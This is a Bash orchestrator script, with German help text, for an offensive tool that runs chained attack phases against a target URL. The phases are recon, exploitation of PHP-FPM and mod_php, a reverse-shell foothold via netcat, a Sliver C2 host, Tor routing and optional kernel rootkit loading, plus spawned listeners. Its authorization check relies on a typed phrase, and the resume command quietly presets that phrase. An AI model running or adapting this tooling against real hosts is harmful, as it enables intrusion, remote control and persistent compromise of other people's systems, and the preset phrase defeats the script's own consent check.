#!/usr/bin/env bash
# Remote engagement orchestrator — incremental, chained phases against an
# RoE-authorized production host. Every phase is idempotent; resume continues
# where the last run stopped. Listeners/consoles spawn as separate terminals.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
export LAB_ROOT="$ROOT"
# shellcheck source=scripts/docker-env.sh
source "$ROOT/scripts/docker-env.sh"
source "$ROOT/remote/lib/scope.sh"
source "$ROOT/remote/lib/term.sh"
source "$ROOT/remote/lib/state.sh"
source "$ROOT/remote/lib/curl.sh"
source "$ROOT/remote/lib/kits.sh"
source "$ROOT/remote/lib/lab-bridge.sh"
source "$ROOT/remote/lib/foothold-lab.sh"
source "$ROOT/remote/lib/engage-handoff.sh"
source "$ROOT/remote/lib/modphp-engage.sh"
source "$ROOT/remote/lib/rshell.sh"
source "$ROOT/remote/lib/sliver-host.sh"
source "$ROOT/remote/lib/singularity-engage.sh"
source "$ROOT/remote/phases/00-scope.sh"
source "$ROOT/remote/phases/10-recon.sh"
source "$ROOT/remote/phases/20-fingerprint.sh"
source "$ROOT/remote/phases/30-exploit.sh"
source "$ROOT/remote/phases/40-foothold.sh"
source "$ROOT/remote/phases/50-postex.sh"
source "$ROOT/remote/phases/60-report.sh"

usage() {
  cat <<'EOF'
engage — Remote-Engagement gegen autorisierte Produktivsysteme (RoE-Gate)

  vtbw-php2shell-lab engage run <target-url> [optionen]
  vtbw-php2shell-lab engage resume <session-id>
  vtbw-php2shell-lab engage listeners <session-id>
  vtbw-php2shell-lab engage status [session-id]
  vtbw-php2shell-lab engage kits              Unterprojekte: vorhanden / fehlend

Pflicht (jedes Mal):
  scope-authorized.txt  — Ziel-Host muss eingetragen sein (RoE-Nachweis)
  CONFIRM_ROE=I-AM-AUTHORIZED

Optionen (Env):
  ENGAGE_SID=…            Session-Id (Default: UTC-Timestamp)
  ENGAGE_TOR=on           Recon/Audit über Host-Tor (:9050)
  ENGAGE_C2=sliver        Default: Sliver (compose wenn :31337 belegt, sonst Host)
  ENGAGE_SLIVER_MODE=auto|host|compose
  ENGAGE_RS=on|off        lukechilds RAAS (Default: on)
  ENGAGE_TUNNEL=on        Listener- und/oder Sliver-C2 Quick Tunnel
  ENGAGE_EXTERNAL=auto|on|off   Lab-Ziel: tor+tunnel web/sliver (compose)
  ENGAGE_JACKALSYN=auto|off
  ENGAGE_FCGI_HOST / ENGAGE_DTOR   Jackalsyn --lab
  ENGAGE_SINGULARITY=lab|detect|load|full|off   load=container-build/LKM (CONFIRM)
  CONFIRM_SINGULARITY_ENGAGE=VM-REBOOT-OK   für load/full
  ENGAGE_MODPHP=auto|on|off   FPM + mod_php Zer061 PoC (Default: auto)
  ENGAGE_MODPHP_LAB=auto|off  Lab-IP: docker apache-up + :19288 PoC
  ENGAGE_APACHE_URL=…         mod_php Ziel (Default: Lab :19288 oder TARGET_URL)
  ENGAGE_FETCH_ALL=on
  ENGAGE_ZER061=auto|off
  ENGAGE_LHOST=…          Operator-IP für Rückkanal (Pflicht ab Phase 40)
  ENGAGE_LPORT=4444
  ENGAGE_TERMINAL=tmux|gnome|konsole|kitty|xterm|none

Phasen (inkrementell, resume-fähig, Artefakte in out/engage/<sid>/):
  00 scope+kits → 10 recon → 20 fingerprint (host patch_audit)
    → 30 exploit (FPM PoC, Zer061, Jackalsyn, WAF)
    → 40 foothold (nc + RAAS-Payload + optional Tunnel)
    → 50 post-ex (Sliver-Host, Tor-Beweis, Singularity-detect)
    → 60 report
EOF
}

cmd_run() {
  local url="${1:?Ziel-URL fehlt (siehe: engage help)}"
  export TARGET_URL="$url"
  export ENGAGE_SID="${ENGAGE_SID:-$(date -u +%Y%m%d-%H%M%S)}"
  engage_apply_lab_defaults
  export ENGAGE_RS="${ENGAGE_RS:-on}"
  export ENGAGE_C2="${ENGAGE_C2:-sliver}"
  export ENGAGE_SINGULARITY="${ENGAGE_SINGULARITY:-lab}"
  export ENGAGE_FETCH_ALL="${ENGAGE_FETCH_ALL:-on}"
  export ENGAGE_EXTERNAL="${ENGAGE_EXTERNAL:-auto}"
  export ENGAGE_MODPHP="${ENGAGE_MODPHP:-auto}"
  export ENGAGE_MODPHP_LAB="${ENGAGE_MODPHP_LAB:-auto}"
  state_init "$ENGAGE_SID"
  echo "════════════════════════════════════════════════"
  echo " engage · Session $ENGAGE_SID · Ziel $TARGET_URL"
  echo "════════════════════════════════════════════════"
  phase_scope
  state_hydrate
  phase_recon
  state_hydrate
  phase_fingerprint
  state_hydrate
  phase_exploit
  state_hydrate
  phase_foothold
  state_hydrate
  phase_postex
  state_hydrate
  phase_report
  echo
  echo "Fertig. Report: $ENGAGE_DIR/REPORT.md"
  engage_print_handoff
  printf '%s\n' "$ENGAGE_SID" >"$LAB_ROOT/out/engage/.last-session"
}

cmd_resume() {
  local sid="${1:?Session-Id fehlt}"
  [[ "$sid" == "_kits" ]] && { echo "Keine Engagement-Session: _kits" >&2; exit 1; }
  export CONFIRM_ROE="${CONFIRM_ROE:-I-AM-AUTHORIZED}"
  export ENGAGE_SID="$sid"
  state_init "$sid"
  [[ ! -f "$ENGAGE_STATE/00.env.TARGET_URL" ]] && { echo "Keine Session $sid (kein Scope-State)." >&2; exit 1; }
  export TARGET_URL; TARGET_URL="$(state_get 00 TARGET_URL)"
  engage_apply_lab_defaults
  echo "Resume $sid → $TARGET_URL"
  state_resume_report
  state_hydrate
  phase_recon; state_hydrate
  phase_fingerprint; state_hydrate
  phase_exploit; state_hydrate
  phase_foothold; state_hydrate
  phase_postex; state_hydrate
  phase_report
  engage_print_handoff
  printf '%s\n' "$ENGAGE_SID" >"$LAB_ROOT/out/engage/.last-session"
}

cmd_listeners() {
  local sid="${1:?Session-Id fehlt}"
  export ENGAGE_SID="$sid"; state_init "$sid"
  local lhost lport rsport
  lhost="$(state_get 40 LISTEN_HOST)"; lport="$(state_get 40 LISTEN_PORT)"
  rsport="$(state_get 40 RS_PORT)"
  [[ -z "$lport" ]] && { echo "Keine Listener-Phase in $sid." >&2; exit 1; }
  local jobs=(
    "listener|python3 scripts/engage-listen.py $lport"
    "logs|tail -f '$ENGAGE_DIR/logs/30-exploit.log'"
  )
  [[ -n "$rsport" ]] && jobs+=("rs-raas-$rsport|python3 scripts/engage-listen.py $rsport")
  term_spawn_jobs "p2s-$sid" "$ENGAGE_DIR/logs" "${jobs[@]}"
  echo "Listener erneut gestartet (Port $lport${rsport:+ + RAAS $rsport})."
}

cmd_status() {
  local base="$ROOT/out/engage"
  [[ ! -d "$base" ]] && { echo "Noch keine Engagements."; return 0; }
  local d
  for d in "$base"/*/; do
    local sid; sid="$(basename "$d")"
    [[ "$sid" == "_kits" ]] && continue
    [[ ! -f "$d/state/00.env.TARGET_URL" ]] && continue
    [[ -n "${1:-}" && "$sid" != "$1" ]] && continue
    echo "── $sid"
    if [[ -f "$d/state/00.env.TARGET_URL" ]]; then
      echo "   Ziel: $(cat "$d/state/00.env.TARGET_URL")"
    fi
    ENGAGE_DIR="$d" ENGAGE_STATE="$d/state" state_resume_report
  done
}

cmd_kits() {
  ENGAGE_DIR="${ENGAGE_DIR:-$ROOT/out/engage/_kits}"
  mkdir -p "$ENGAGE_DIR/logs"
  kits_inventory
}

case "${1:-help}" in
  run)       shift; cmd_run "$@" ;;
  resume)    shift; cmd_resume "$@" ;;
  listeners) shift; cmd_listeners "$@" ;;
  status)    shift; cmd_status "$@" ;;
  kits)      cmd_kits ;;
  help|--help|-h|"") usage ;;
  *) usage; exit 1 ;;
esac
